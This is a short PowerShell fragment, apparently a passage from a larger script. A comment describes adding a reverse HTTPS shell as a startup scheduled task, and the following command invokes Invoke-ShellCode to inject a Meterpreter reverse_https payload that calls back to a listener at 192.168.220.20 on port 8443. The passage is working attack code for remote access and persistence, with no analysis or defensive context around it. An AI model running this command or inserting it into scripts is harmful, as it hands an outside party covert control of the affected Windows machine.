...
<# Memo Handler Added to create reverse https shell startup schtask #>

Invoke-ShellCode -Payload Windows/meterpreter/reverse_https -Lhost 192.168.220.20 -Lport 8443 -Force
